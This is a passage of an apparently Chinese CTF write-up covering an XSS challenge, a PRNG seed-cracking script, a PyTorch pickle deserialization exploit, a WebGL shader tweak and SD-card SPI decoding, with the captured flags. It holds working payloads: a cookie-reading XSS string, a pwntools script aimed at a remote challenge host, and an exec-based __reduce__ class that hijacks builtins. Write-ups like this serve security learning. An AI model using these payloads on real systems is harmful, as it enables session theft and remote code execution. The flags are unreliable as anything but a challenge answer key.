\u7684\u5185\u5bb9\u3002 \u518d\u770b\u7b2c\u4e00\u4e2a\u94fe\u63a5\uff0c\u5176 result \u662f\u53ef\u4ee5\u6784\u9020\u7684\uff0c\u76f8\u5173\u903b\u8f91\uff1a const queryString = window . location . search ; const urlParams = new URLSearchParams ( queryString ); const result = urlParams . get ( 'result' ); const b64decode = atob ( result ); const colon = b64decode . indexOf ( \":\" ); const score = b64decode . substring ( 0 , colon ); const username = b64decode . substring ( colon + 1 ); document . querySelector ( \"#greeting\" ). innerHTML = \"\u60a8\u597d\uff0c\" + username + \"\uff01\" ; document . querySelector ( \"#score\" ). innerHTML = \"\u60a8\u5728\u7ec3\u4e60\u4e2d\u83b7\u5f97\u7684\u5206\u6570\u4e3a <b>\" + score + \"</b>/100\u3002\" ; \u4e5f\u5c31\u662f\u5c06 result base64 \u89e3\u7801\uff0c: \u524d\u9762\u7684\u4e3a\u5206\u6570\uff0c\u540e\u9762\u7684\u4e3a\u7528\u6237\u540d\uff0c\u7136\u540e\u586b\u5199\u8fdb\u53bb\u3002\u8fd9\u91cc\u5c31\u53ef\u4ee5\u8fdb\u884c xss\u3002\u6ca1\u5b66\u8fc7 xss\uff0c\u6240\u4ee5\u60f3\u4e86\u534a\u5929\u63d2\u5165\u4e00\u4e2a script tag \u4e4b\u540e\u600e\u4e48\u8ba9\u5904\u5728\u524d\u9762\u7684\u5b83\u88ab\u8fd0\u884c\uff0c\u540e\u6765\u641c\u4e86\u641c\u624d\u77e5\u9053\u53ef\u4ee5\u5229\u7528 onload onerror \u8fd9\u4e9b\u4e8b\u4ef6\u6765\u586b\u5199\u811a\u672c\u3002 \u6240\u4ee5 payload \u5c31\u662f 100:<img src=1 onerror=\"document.querySelector('#greeting').innerHTML=document.cookie\"> \uff0c\u7136\u540e base64 \u540e\u4f5c\u4e3a result \u4f20\u5165\uff0c\u518d\u4e22\u7ed9\u7b2c\u4e8c\u4e2a\u63d0\u4ea4\u94fe\u63a5\uff0c\u5f97\u5230 flag\uff1a flag{xS5_1OI_is_N0t_SOHARD_3c97784c1a} \u8499\u7279\u5361\u7f57\u8f6e\u76d8\u8d4c \u00b6 \u8fd9\u4e2a\u4f30\u7b97\u5706\u5468\u7387\u7684\u7ecf\u5178\u7b97\u6cd5\u4f60\u4e00\u5b9a\u542c\u8bf4\u8fc7\uff1a\u5f80\u4e00\u4e2a 1x1 \u5927\u5c0f\u7684\u65b9\u683c\u91cc\u968f\u673a\u6492 N \u4e2a\u70b9\uff0c\u7edf\u8ba1\u843d\u5728\u4ee5\u65b9\u683c\u67d0\u4e2a\u9876\u70b9\u4e3a\u5706\u5fc3\u30011 \u4e3a\u534a\u5f84\u7684 1/4 \u6247\u5f62\u533a\u57df\u4e2d\u6492\u843d\u7684\u70b9\u6570\u4e3a M\uff0c\u90a3\u4e48 M/N \u5c31\u5c06\u63a5\u8fd1\u4e8e \u03c0/4 \u3002 \u5f53\u7136\uff0c\u8fd9\u662f\u4e00\u4e2a\u6982\u7387\u6027\u7b97\u6cd5\uff0c\u5982\u679c\u60f3\u5f97\u5230\u66f4\u7cbe\u786e\u7684\u503c\uff0c\u5c31\u9700\u8981\u6492\u66f4\u591a\u7684\u70b9\u3002\u7531\u4e8e\u6492\u70b9\u662f\u968f\u673a\u7684\uff0c\u81ea\u7136\u4e5f\u65e0\u6cd5\u9884\u6d4b\u67d0\u6b21\u6492\u70b9\u5b9e\u9a8c\u5f97\u5230\u7684\u7ed3\u679c\u5230\u5e95\u662f\u591a\u5c11\u2014\u2014\u4f46\u771f\u7684\u662f\u8fd9\u6837\u5417\uff1f \u6709\u4f4d\u597d\u4e8b\u4e4b\u5f92\u51b3\u5b9a\u501f\u6b64\u548c\u4f60\u6765\u4e00\u573a\u8f6e\u76d8\u8d4c\uff1a\u6492 40 \u4e07\u4e2a\u70b9\u8ba1\u7b97\u5706\u5468\u7387\uff0c\u800c\u4f60\u9700\u8981\u731c\u6d4b\u5b9e\u9a8c\u7684\u7ed3\u679c\u7cbe\u786e\u5230\u5c0f\u6570\u70b9\u540e\u4e94\u4f4d\u3002\u4e3a\u4e86\u9632\u6b62\u8fd0\u6c14\u592a\u597d\u78b0\u5de7\u731c\u4e2d\uff0c\u4f60\u4eec\u7ea6\u5b9a\u4e94\u5c40\u4e09\u80dc\u3002 \u770b\u8d77\u6765\u6ca1\u4ec0\u4e48\u5176\u5b83\u6f0f\u6d1e\uff0c\u4ece\u4f2a\u968f\u673a\u5165\u624b\uff0c\u8bbe\u7f6e\u7684\u968f\u673a\u79cd\u5b50\u4e3a time(0)+clock()\uff0c\u4e5f\u5c31\u662f\u5f53\u524d\u65f6\u95f4\u6233\u52a0\u4e0a\u7a0b\u5e8f\u8fd0\u884c\u5230\u6b64\u5904\u7684 ticks \u6570\u3002\u65f6\u95f4\u6233\u4ee5\u79d2\u4e3a\u5355\u4f4d\uff0c\u6ce2\u52a8\u4e0d\u5927\uff0c\u76f4\u63a5\u4f7f\u7528\u8fde\u63a5\u65f6\u7684\u65f6\u95f4\u6233\u5c31\u53ef\u4ee5\u3002clock() \u4f1a\u6709\u8f83\u5927\u6ce2\u52a8\uff0c\u4ece 0 \u5f00\u59cb\u679a\u4e3e\uff0c\u5c06\u5f97\u5230\u7684\u503c\u4f20\u5165\u4e00\u4e2a C \u7a0b\u5e8f\u4e2d\u4f5c\u4e3a\u968f\u673a\u79cd\u5b50\uff0c\u6a21\u62df\u4e00\u4e0b\uff0c\u770b\u4e00\u770b\u524d\u4e24\u4e2a\u662f\u5426\u80fd\u548c\u6b63\u786e\u7ed3\u679c\u5bf9\u4e0a\u3002\u80fd\u5bf9\u4e0a\u5219\u8bf4\u660e\u968f\u673a\u79cd\u5b50\u627e\u5bf9\u4e86\uff0c\u5c06\u540e\u4e09\u4e2a\u7ed3\u679c\u8f93\u56de\u53bb\u5373\u53ef\u5b8c\u6210\u3002 import time import subprocess from tqdm import tqdm from pwn import * # p = process('./challenge') p = remote ( \"202.38.93.111\" , 10091 ) token = \"...\" p . sendlineafter ( b \": \" , token . encode ()) timestamp = int ( time . time ()) def crack_seed ( res1 , res2 ): for clock in tqdm ( range ( 0 , 9000 )): seed = timestamp + clock cracker = subprocess . run ( [ \"./exp\" , str ( seed )], stdout = subprocess . PIPE , ) res = cracker . stdout . decode () . strip () . split ( ' \\n ' ) if res [ 0 ] == str ( res1 ) and res [ 1 ] == str ( res2 ): print ( seed ) return res seed = timestamp - clock cracker = subprocess . run ( [ \"./exp\" , str ( seed )], stdout = subprocess . PIPE , ) res = cracker . stdout . decode () . strip () . split ( ' \\n ' ) if res [ 0 ] == str ( res1 ) and res [ 1 ] == str ( res2 ): print ( seed ) return res exit ( 1 ) p . recvuntil ( \"\uff1a\" . encode ( \"utf-8\" )) p . sendline ( b '3.14159' ) win = p . recvline () . decode () . strip () if win == \"\u731c\u5bf9\u4e86\uff01\" : res1 = \"3.14159\" else : p . recvuntil ( \"\uff1a\" . encode ( \"utf-8\" )) res1 = p . recvline () . decode () . strip () p . recvuntil ( \"\uff1a\" . encode ( \"utf-8\" )) p . sendline ( b '3.14159' ) win = p . recvline () . decode () . strip () if win == \"\u731c\u5bf9\u4e86\uff01\" : res2 = \"3.14159\" else : p . recvuntil ( \"\uff1a\" . encode ( \"utf-8\" )) res2 = p . recvline () . decode () . strip () print ( res2 ) res = crack_seed ( res1 , res2 ) p . recvuntil ( \"\uff1a\" . encode ( \"utf-8\" )) p . sendline ( res [ 2 ] . encode ( \"utf-8\" )) p . recvuntil ( \"\uff1a\" . encode ( \"utf-8\" )) p . sendline ( res [ 3 ] . encode ( \"utf-8\" )) p . recvuntil ( \"\uff1a\" . encode ( \"utf-8\" )) p . sendline ( res [ 4 ] . encode ( \"utf-8\" )) p . interactive () \u8fd0\u884c\u5f97\u5230 flag\uff1a flag{raNd0m_nUmb34_a1wayS_m4tters_\u2026\u2026} \u54e6\u5bf9\u4e86\uff0c\u6709\u4e00\u4e2a\u5f88\u5751\u7684\u70b9\u662f mac \u4e0a\u7684 gcc \u5176\u5b9e\u662f clang \u7684 alias\uff0c\u800c clang \u548c gcc \u7684\u968f\u673a\u6570\u6709\u533a\u522b\uff0c\u5728 mac \u4e0a\u8dd1\u7684\u8bdd\u5c31\u4e00\u76f4\u7206\u4e0d\u51fa\u6765\u79cd\u5b50\u3002\u5728 Linux \u4e0a\u5c31\u53ef\u4ee5\u4e00\u4e0b\u7206\u51fa\u6765\u3002 \u4e8c\u6b21\u5143\u795e\u7ecf\u7f51\u7edc \u00b6 \u5929\u51b7\u6781\u4e86\uff0c\u4e0b\u7740\u96ea\uff0c\u53c8\u5feb\u9ed1\u4e86\u3002\u8fd9\u662f\u4e00\u5e74\u7684\u6700\u540e\u4e00\u5929\u2014\u2014\u5927\u5e74\u591c\u3002\u5728\u8fd9\u53c8\u51b7\u53c8\u9ed1\u7684\u665a\u4e0a\uff0c\u4e00\u4e2a\u6ca1\u6709 GPU\u3001\u6ca1\u6709 TPU \u7684\u5c0f\u5973\u5b69\uff0c\u5728\u8857\u4e0a\u7f13\u7f13\u5730\u8d70\u7740\u3002\u5979\u4ece\u5bb6\u91cc\u51fa\u6765\u7684\u65f6\u5019\u8fd8\u5e26\u7740\u6361\u5783\u573e\u6361\u6765\u7684 E3 \u5904\u7406\u5668\uff0c\u4f46\u662f\u6709\u4ec0\u4e48\u7528\u5462\uff1f\u8dd1\u4e0d\u52a8 Stable Diffusion\uff0c\u4e5f\u8dd1\u4e0d\u52a8 NovelAI\u3002\u5979\u4e5f\u60f3\u7528\u81ea\u5df1\u7684\u5904\u7406\u5668\u8bad\u7ec3\u4e00\u4e2a\u795e\u7ecf\u7f51\u7edc\uff0c\u751f\u6210\u4e00\u4e9b\u4e8c\u6b21\u5143\u7684\u56fe\u7247\u3002 \u4e8e\u662f\u5979\u914d\u7f6e\u597d\u4e86 PyTorch 1.9.1\uff0c\u5b9a\u4e49\u4e86\u4e00\u4e2a\u6781\u5176\u7b80\u5355\u7684\u6a21\u578b\uff0c\u7528\u81ea\u5df1\u6536\u96c6\u7684 10 \u5f20\u4e8c\u6b21\u5143\u56fe\u7247\u548c\u5bf9\u5e94\u7684\u6807\u7b7e\u5f00\u59cb\u4e86\u8bad\u7ec3\u3002 \u5979\u5728 CPU \u4e0a\u5f00\u59cb\u4e86\u7b2c\u4e00\u4e2a epoch \u7684\u8bad\u7ec3\uff0closs \u4e00\u76f4\u5728\u4e0b\u964d\uff0c\u8bb8\u591a\u4e8c\u6b21\u5143\u56fe\u7247\u91cd\u53e0\u5728\u4e00\u8d77\uff0c\u5728\u5411\u5979\u7728\u773c\u775b\u3002 \u5979\u53c8\u5f00\u59cb\u4e86\u7b2c\u4e8c\u4e2a epoch\uff0closs \u8d8a\u6765\u8d8a\u4f4e\uff0c\u56fe\u7247\u8d8a\u6765\u8d8a\u7cbe\u7f8e\uff0c\u5979\u7684\u773c\u775b\u4e5f\u8d8a\u6765\u8d8a\u7d2f\uff0c\u5979\u7684\u773c\u775b\u5f00\u59cb\u95ed\u4e0a\u4e86\u3002 ... \u7b2c\u4e8c\u5929\u6e05\u6668\uff0c\u8fd9\u4e2a\u5c0f\u5973\u5b69\u5750\u5728\u5899\u89d2\u91cc\uff0c\u4e24\u816e\u901a\u7ea2\uff0c\u5634\u4e0a\u5e26\u7740\u5fae\u7b11\u3002\u65b0\u5e74\u7684\u592a\u9633\u5347\u8d77\u6765\u4e86\uff0c\u7167\u5728\u5979\u5c0f\u5c0f\u7684\u5c38\u4f53\u4e0a\u3002 \u4eba\u4eec\u53d1\u73b0\u5979\u65f6\u624d\u77e5\u9053\uff0c\u5979\u7684\u6a21\u578b\u5728 10 \u5f20\u56fe\u7247\u4e0a\u8fc7\u62df\u5408\u4e86\uff0c\u51e0\u4e4e\u6ca1\u6709\u8bef\u5dee\u3002 \uff08\u5b8c\uff09 \u542c\u5b8c\u8fd9\u4e2a\u6545\u4e8b\uff0c\u4f60\u4e00\u8138\u7684\u4e0d\u76f8\u4fe1\uff1a\u300c\u8fd9\u4e48\u7b80\u5355\u7684\u6a21\u578b\u600e\u4e48\u53ef\u80fd\u6ca1\u6709\u8bef\u5dee\u5462\uff1f\u300d\uff0c\u4e8e\u662f\u4f60\u5f00\u59cb\u590d\u73b0\u8fd9\u4e2a\u4e8c\u6b21\u5143\u795e\u7ecf\u7f51\u7edc\u3002 \u76ee\u6807\u770b\u8d77\u6765\u5c31\u662f\u8ba9\u6a21\u578b\u751f\u6210\u7684\u56fe\u7247\u548c\u9884\u671f\u51e0\u4e4e\u6ca1\u6709\u8bef\u5dee\u3002\u8bd5\u7740\u591a\u8bad\u7ec3\u51e0\u8f6e\uff0c\u8bd5\u56fe\u8fc7\u62df\u5408\uff0c\u8bb0\u5f55\u4e00\u4e0b loss\uff0c\u53d1\u73b0\u964d\u5230 0.001+ \u7684\u65f6\u5019\u5c31\u964d\u4e0d\u4e0b\u53bb\u4e86\uff0c\u800c\u9700\u8981\u7684\u662f 0.0005 \u770b\u8d77\u6765\u4e0d\u53ef\u884c\u3002\u800c\u4e14\u8fd9\u662f\u4e00\u9053 web \u7c7b\u9898\uff0c\u8003\u8651\u7528\u4e00\u4e9b\u624b\u6bb5\u6765\u8ba9\u5b83\u8ba4\u4e3a\u6211\u7684\u8f93\u51fa\u662f\u5b8c\u5168\u6b63\u786e\u7684\u3002 \u641c\u7d22\u53ef\u4ee5\u53d1\u73b0\u5b58\u7684 .pt \u6587\u4ef6\u4e2d\u6709\u4f7f\u7528 pickle \u5e8f\u5217\u5316\u5b58\u50a8\u7684 .pkl \u6587\u4ef6\u3002\u800c\u5728\u8bfb\u53d6\u7684\u65f6\u5019\u4e5f\u4f1a\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\uff0c\u8fd9\u4e5f\u5c31\u5b58\u5728\u4e00\u4e2a pickle \u53cd\u5e8f\u5217\u5316\u7684\u6f0f\u6d1e\u3002 \u6211\u4eec\u53ef\u4ee5\u81ea\u5df1\u5199\u4e00\u4e2a\u6076\u610f\u7c7b\u7136\u540e\u6253\u5305\u5230 data.pkl \u538b\u7f29\u8fdb .pt \u6587\u4ef6\uff0c\u5728\u53cd\u5e8f\u5217\u5316\u7684\u65f6\u5019\u5c31\u4f1a\u6267\u884c\u5176\u4e2d\u7684\u4ee3\u7801\uff0c\u6bd4\u5982\uff1a class Exploit ( object ): def __reduce__ ( self ): return ( os . system , ( \"...\" , )) \u8fd9\u4e2a\u5728\u672c\u5730\u6d4b\u8bd5\u7684\u65f6\u5019\u8fd0\u884c infer.py \u53ef\u4ee5\u6253\u901a\uff0c\u4f46\u8fdc\u7a0b\u5c31\u4e0d\u53ef\u4ee5\u3002\u6240\u4ee5\u53ef\u4ee5\u731c\u6d4b\u8fdc\u7a0b\u5b9e\u9645\u4e0a\u4ece\u5176\u5b83\u6a21\u5757\u4e2d\u8c03\u7528\u4e86 infer \u51fd\u6570\uff0c\u5982\u679c\u6ca1\u6709\u6b63\u5e38\u8fd4\u56de\uff0c\u5219\u4f1a\u62a5\u9519\u3002 \u90a3\u4e48\u6211\u4eec\u7684\u601d\u8def\u5c31\u662f\u8ba9\u6574\u4e2a\u7a0b\u5e8f\u90fd\u53ef\u4ee5\u6b63\u5e38\u8fd0\u884c\uff0c\u53ea\u662f\u5728\u53cd\u5e8f\u5217\u5316\u7684\u65f6\u5019\u8fdb\u884c\u4e00\u4e9b\u64cd\u4f5c\u3002\u6839\u636e\u6e90\u7801\u53ef\u4ee5\u77e5\u9053\u6700\u7ec8\u4f1a\u5c06\u6a21\u578b\u8f93\u51fa\u7684\u7ed3\u679c\u5b58\u653e\u5728 /tmp/result.json \u4e2d\uff0c\u7136\u540e\u5728\u5176\u5b83\u4f4d\u7f6e\u518d\u8bfb\u53d6\u8fd9\u4e2a\u6587\u4ef6\uff0c\u8fdb\u884c\u5224\u65ad\u3002\u800c\u5982\u679c\u6ca1\u6709\u8fd9\u4e2a\u6587\u4ef6\u5219\u4f1a\u76f4\u63a5\u62a5\u9519\u3002 \u6240\u4ee5\u53ef\u4ee5\u5728 reduce \u4e2d\u5c06\u5b8c\u5168\u6b63\u786e\u7684\u7ed3\u679c\u5148\u5199\u5165 /tmp/result.json \u4e2d\u3002\u4f46\u5982\u679c\u8fd9\u65f6\u76f4\u63a5 exit\uff0c\u5219\u540e\u9762\u7a0b\u5e8f\u65e0\u6cd5\u6267\u884c\uff0c\u4f1a\u51fa\u73b0\u62a5\u9519\u3002\u6240\u4ee5\u8fd8\u9700\u8981\u8ba9\u540e\u9762\u5b8c\u5168\u6b63\u5e38\u8fd0\u884c\u3002\u6574\u4e2a infer \u51fd\u6570\u7684\u903b\u8f91\u5927\u6982\u5982\u4e0b\uff1a def infer ( pt_file ): # ... model = SimpleGenerativeModel ( n_tags = n_tags , dim = dim , img_shape = img_shape ) model . load_state_dict ( torch . load ( pt_file , map_location = \"cpu\" )) # ... predict json . dump ({ \"gen_imgs_b64\" : gen_imgs }, open ( \"/tmp/result.json\" , \"w\" )) \u6211\u4eec\u8f93\u5165\u7684 pt \u6587\u4ef6\u4f1a\u5728 torch.load \u4e2d\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\uff0c\u8fd9\u65f6\u4f1a\u5199\u5165 /tmp/result.json\u3002\u800c\u540e\u9762\u5bf9\u4e8e\u6211\u4eec\u5199\u5165\u7684\u5a01\u80c1\u5c31\u662f\u8fd8\u4f1a json.dump \u4e00\u6b21\u3002\u6240\u4ee5\u9996\u5148\u9700\u8981\u5c06 json.dump \u8fd9\u4e2a\u51fd\u6570\u7684\u4f5c\u7528\u62b9\u9664\u6389\uff1a __import__('json').dump=lambda x, y: 0 \u3002\u4f46\u8fd9\u8fd8\u4e0d\u591f\uff0c\u56e0\u4e3a\u53c2\u6570\u4e2d\u7684 open \u4e5f\u4f1a\u6267\u884c\uff0c\u4ee5 w \u65b9\u5f0f\u6253\u5f00\u6587\u4ef6\u7684\u8bdd\u4f1a\u5148\u76f4\u63a5\u6e05\u7a7a\u6587\u4ef6\uff0c\u6240\u4ee5\u4e5f\u9700\u8981\u62b9\u6389 open \u7684\u4f5c\u7528\u3002\u4e0d\u8fc7\u540e\u9762\u80af\u5b9a\u8fd8\u4f1a\u9700\u8981\u4f7f\u7528 open \u6765\u8bfb\u53d6\u6587\u4ef6\uff0c\u6240\u4ee5\u53ea\u80fd\u62b9\u6389\u5199\u5165\u7684\u90e8\u5206\uff1a __builtins__['_open'] = open; __builtins__['open']=lambda x, y: 0 if y=='w' else __builtins__['_open'](x, y) \u3002 \u8fd9\u6837\u6765\u8bb2\u6211\u4eec\u7684 exp \u5c31\u662f\uff1a class Exploit ( object ): def __reduce__ ( self ): text = '{\"gen_imgs_b64\": [\"......' return ( exec , ( f \"open('/tmp/result.json', 'w').write(' { text } ');\" \"__import__('json').dump=lambda x, y: 0;\" \"__builtins__['_open']=open;\" \"__builtins__['open']=lambda x, y: 0 if y=='w' else __builtins__['_open'](x, y)\" , )) \u4f46\u4ec5\u5c06\u8fd9\u4e2a\u6253\u5305\u540e\u5f97\u5230\u7684 data.pkl \u76f4\u63a5\u538b\u7f29\u8fdb pt \u6587\u4ef6\u8fd8\u662f\u4e0d\u884c\u3002\u56e0\u4e3a\u6a21\u578b\u5c31\u6ca1\u6cd5\u6b63\u5e38\u8bfb\u53d6\u4e86\uff0c\u6240\u4ee5\u8fd8\u9700\u8981\u5bf9\u5176\u8fdb\u884c\u4e00\u4e9b\u4fee\u6539\u3002 pkl \u6587\u4ef6\u5b9e\u9645\u5b58\u50a8\u7684\u662f\u4e00\u4e2a\u6784\u9020\u597d\u7684\u865a\u62df\u673a\u6307\u4ee4\uff0cpickle \u53cd\u5e8f\u5217\u5316\u65f6\u4f1a\u6267\u884c\u5b83\u3002\u770b\u6e90\u7801\u53ef\u4ee5\u4e86\u89e3\u5230\u6709\u4e00\u4e2a\u6307\u4ee4 0x2E \u8868\u793a\u4e86\u7ed3\u675f\u8fd4\u56de\u3002\u6240\u4ee5\u76f4\u63a5\u5c06\u751f\u6210\u7684 data.pkl \u672b\u5c3e\u7684 0x2E \u53bb\u6389\uff0c\u7136\u540e\u76f4\u63a5\u63a5\u4e0a\u4e00\u4efd\u6b63\u786e\u7684 data.pkl \u5185\u5bb9\u5373\u53ef\u5b8c\u6210\u6784\u9020\u3002 \u6784\u9020\u597d\u540e\u4e0a\u4f20 pt \u6587\u4ef6\uff0c\u5373\u53ef\u8fbe\u5230\u76ee\u6807\u5f97\u5230 flag\uff1a flag{Torch.Load.Is.Dangerous-\u2026\u2026} \u5149\u4e0e\u5f71 \u00b6 \u5192\u9669\uff0c\u5c31\u8981\u4e0d\u65ad\u5411\u524d\uff01 \u5728\u5bc2\u9759\u7684\u795e\u79d8\u661f\u7403\u4e0a\uff0c\u7ee7\u7eed\u524d\u8fdb\uff0c\u63a2\u5bfb flag \u7684\u5965\u79d8\u5427\uff01 \u6253\u5f00\u53d1\u73b0\u662f\u4e00\u4e2a WebGL \u6e32\u67d3\u7684\u573a\u666f\uff0c\u5176\u4e2d flag \u7684\u5185\u5bb9\u88ab\u6321\u4f4f\u4e86\u3002\u6240\u6709\u5185\u5bb9\u90fd\u662f\u5728\u524d\u7aef\u7684\uff0c\u5b58\u4e0b\u6765\u5c31\u53ef\u4ee5\u672c\u5730\u8c03\u8bd5\u3002 \u53d1\u73b0\u5176\u4e2d\u7684\u4e3b\u8981\u573a\u666f\u6e32\u67d3\u4ee3\u7801\u90fd\u5728 fragment-shader.js \u4e2d\u3002\u53ef\u4ee5\u53d1\u73b0\u7531\u4e00\u4e9b sdf \u7ec4\u6210\uff0c\u6700\u7ec8\u7684\u573a\u666f\u4e5f\u662f\u7531\u51e0\u4e2a sdf \u7ed3\u679c\u53d6 min \u800c\u6765\u7684\u3002 \u770b\u8d77\u6765 t5SDF \u7684\u4ee3\u7801\u6700\u77ed\uff0c\u53ef\u80fd\u662f\u65bd\u52a0\u7684\u906e\u76d6\u3002\u6240\u4ee5\u5c06 sceneSDF \u4e2d t5 \u76f8\u5173\u7684\u90e8\u5206\u5220\u6389\uff0c\u518d\u6253\u5f00\u9875\u9762\u8fd0\u884c\u5373\u53ef\u770b\u5230\u5b8c\u6574 flag\uff1a flag{SDF-i3-FuN!} \u7247\u4e0a\u7cfb\u7edf \u00b6 \u6700\u8fd1\uff0c\u4f60\u542c\u8bf4\u5ba4\u53cb\u5728 SD \u5361\u65b9\u9762\u53d6\u5f97\u4e86\u4e9b\u8fdb\u5c55\u3002\u5728\u4ed6\u65e5\u590d\u4e00\u65e5\u7684\u81ea\u8a00\u81ea\u8bed\u4e2d\uff0c\u4f60\u9010\u6e10\u4e86\u89e3\u5230\u8fd9\u4e2a\u7531\u4ed6\u4e00\u4e2a\u4eba\u81ea\u4e3b\u7814\u53d1\u7684\u7247\u4e0a\u7cfb\u7edf\u73b0\u5728\u5df2\u7ecf\u53ef\u4ee5\u4ece SD \u5361\u542f\u52a8\uff1a\u5148\u7531\u201c\u7247\u4e0a ROM \u4e2d\u7684\u56fa\u4ef6\u201d\u52a0\u8f7d\u5e76\u8fd0\u884c SD \u5361\u7b2c\u4e00\u4e2a\u6247\u533a\u4e2d\u7684\u201c\u5f15\u5bfc\u7a0b\u5e8f\u201d\uff0c\u4e4b\u540e\u7531\u8fd9\u4e2a\u201c\u5f15\u5bfc\u7a0b\u5e8f\u201d\u4ece SD \u5361\u4e2d\u52a0\u8f7d\u201c\u64cd\u4f5c\u7cfb\u7edf\u201d\u3002\u800c\u8fd9\u4e2a\u201c\u64cd\u4f5c\u7cfb\u7edf\u201d\u76ee\u524d\u80fd\u505a\u7684\u53ea\u662f\u5411\u201c\u4e32\u53e3\u201d\u8f93\u51fa\u4e00\u4e9b\u5b57\u7b26\u3002 \u540c\u65f6\u4f60\u542c\u8bf4\uff0c\u8fd9\u4e2a\u5e76\u4e0d\u5b8c\u5584\u7684 SD \u5361\u9a71\u52a8\u53ea\u4f7f\u7528\u4e86 SD \u5361\u7684 SPI \u6a21\u5f0f\uff0c\u800c\u4f20\u8f93\u901f\u5ea6\u4e5f\u662f\u4f4e\u5f97\u611f\u4eba\u3002\u6b64\u65f6\u4f60\u7a81\u7136\u60f3\u5230\uff1a\u5982\u679c\u901f\u5ea6\u4e0d\u5feb\u7684\u8bdd\uff0c\u662f\u4e0d\u662f\u53ef\u4ee5\u7528\u903b\u8f91\u5206\u6790\u4eea\u6765\u91c7\u96c6\uff08\u5077\u7a83\uff09\u8fd9\u4e2a SD \u5361\u7684\u4fe1\u53f7\uff0c\u4ece\u800c\u201c\u83b7\u5f97\u201d SD \u5361\u4ee5\u81f3\u4e8e\u8fd9\u4e2a\u201c\u64cd\u4f5c\u7cfb\u7edf\u201d\u7684\u79d8\u5bc6\uff1f \u4f60\u4ece\u62bd\u5c49\u89d2\u843d\u638f\u51fa\u5403\u7070\u5df2\u4e45\u7684\u903b\u8f91\u5206\u6790\u4eea\u3002\u8fd9\u4e2a\u5c0f\u4e1c\u897f\u4ef7\u683c\u4e0d\u5230 50 \u5757\u94b1\uff0c\u91c7\u6837\u7387\u4e5f\u53ea\u6709 24 M\u3002\u4f60\u6253\u5f00 PulseView\uff0c\u628a\u91c7\u6837\u7387\u8c03\u9ad8\uff0c\u8fde\u4e0a\u5ba4\u53cb\u5f00\u53d1\u677f\u4e0a SD \u5361\u7684\u5f15\u811a\uff0c\u7136\u540e\u63a5\u901a\u4e86\u5f00\u53d1\u677f\u7684\u7535\u6e90\uff0c\u5e0c\u671b\u8fd9\u804a\u80dc\u4e8e\u65e0\u7684\u5206\u6790\u4eea\u771f\u7684\u80fd\u6293\u5230\u70b9\u4ec0\u4e48\u6709\u610f\u601d\u7684\u4fe1\u53f7\u3002\u81f3\u4e8e\u4f60\u4e3a\u4ec0\u4e48\u6ca1\u6709\u76f4\u63a5\u628a SD \u5361\u62ff\u4e0b\u6765\u8bfb\u53d6\u6570\u636e\uff0c\u5c31\u6ca1\u4eba\u77e5\u9053\u4e86\u3002 \u5f15\u5bfc\u6247\u533a \u542c\u8bf4\uff0c\u7b2c\u4e00\u4e2a flag \u85cf\u5728 SD \u5361\u7b2c\u4e00\u4e2a\u6247\u533a\u7684\u672b\u5c3e\u3002\u4f60\u80fd\u627e\u5230\u5b83\u5417\uff1f \u64cd\u4f5c\u7cfb\u7edf \u5ba4\u53cb\u7684\u201c\u64cd\u4f5c\u7cfb\u7edf\u201d\u4f1a\u8f93\u51fa\u4e00\u4e9b\u8c03\u8bd5\u4fe1\u606f\u548c\u7b2c\u4e8c\u4e2a flag\u3002\u4ece\u5ba4\u53cb\u524d\u4e9b\u65e5\u5b50\u793e\u4ea4\u7f51\u7edc\u53d1\u5e03\u7684\u7ec8\u7aef\u622a\u56fe\u770b\uff0c\u8fd9\u4e2a\u201c\u64cd\u4f5c\u7cfb\u7edf\u201d\u6bcf\u6b21\u201c\u542f\u52a8\u201d\u90fd\u4f1a\u9996\u5148\u8f93\u51fa\uff1a LED: ON Memory: OK \u6216\u8bb8\u4f60\u53ef\u4ee5\u6839\u636e\u8fd9\u4e00\u90e8\u5206\u56fa\u5b9a\u7684\u8f93\u51fa\u548c\u5f15\u5bfc\u6247\u533a\u7684\u4ee3\u7801\uff0c\u5148\u641e\u6e05\u695a\u90a3\u201c\u4e32\u53e3\u201d\u548c\u201cSD \u5361\u9a71\u52a8\u201d\u5230\u5e95\u662f\u600e\u4e48\u5de5\u4f5c\u7684\uff0c\u4e4b\u540e\u518d\u4ed4\u7ec6\u7814\u7a76 flag \u5230\u5e95\u662f\u4ec0\u4e48\uff0c\u5c31\u50cf\u5f53\u5e74\u7684 Enigma \u4e00\u6837\u3002 \u7b2c\u4e00\u90e8\u5206\u76f4\u63a5\u4f7f\u7528 PulseView \u8f6f\u4ef6\u8bfb\u53d6 binary \u6587\u4ef6\uff0c\u5f97\u5230\u4fe1\u53f7\uff0c\u7136\u540e\u6dfb\u52a0 SD card\uff08SPI mode\uff09\u89e3\u7801\u5668\uff0c\u5c06\u51e0\u4e2a\u4fe1\u53f7\u63a5\u4e0a\uff0c\u5c31\u53ef\u4ee5\u5728 MOSI data \u4e2d\u770b\u5230 flag dump \u51fa\u6765\u7136\u540e\u8f6c\u6362\u5373\u53ef\u5f97\u5230 flag\uff1a flag{0K_you_goT_th3_b4sIc_1dE4_caRRy_0N} \u7b2c\u4e8c\u90e8\u5206\u8bd5\u56fe\u9006\u5411\u540e\u9762\u7684 RISCV \u6307\u4ee4\uff0c\u4f46\u5b8c\u5168\u770b\u4e0d\u51fa\u4ec0\u4e48\u6709\u610f\u4e49\u7684\u4e1c\u897f\uff0c\u6000\u7591\u662f\u6570\u636e\u641e\u9519\u4e86\uff0c\u61d2\u5f97\u4fee\uff0c\u7f62\u4e86\u3002 \u4f01\u9e45\u62fc\u76d8 \u00b6 \u8fd9\u662f\u4e00\u4e2a\u53ef\u7231\u7684\u4f01\u9e45\u6ed1\u5757\u62fc\u76d8\u3002\uff08\u89c9\u5f97\u4e0d\u53ef\u7231\u7684\u540c\u5b66\u53ef\u4ee5\u6362\u53ef\u7231\u7684\u9898\u505a\uff09 \u548c\u5e02\u9762\u4e0a\u53ea\u80fd\u6253\u4e71\u4e4b\u540e\u62fc\u56de\u7684\u666e\u901a\u6ed1\u5757\u62fc\u76d8\u4e0d\u540c\uff0c\u8fd9\u4e2a\u62fc\u76d8\u662f\u81ea\u52a8\u6253\u4e71\u62fc\u56de\u7684\u3002\u4e00\u6b21\u6e38\u620f\u53ef\u4ee5\u5e2e\u52a9\u60a8\u4f53\u9a8c\u5230 16/256/4096 \u6b21\u666e\u901a\u62fc\u76d8\u7684\u4e50\u8da3\u3002 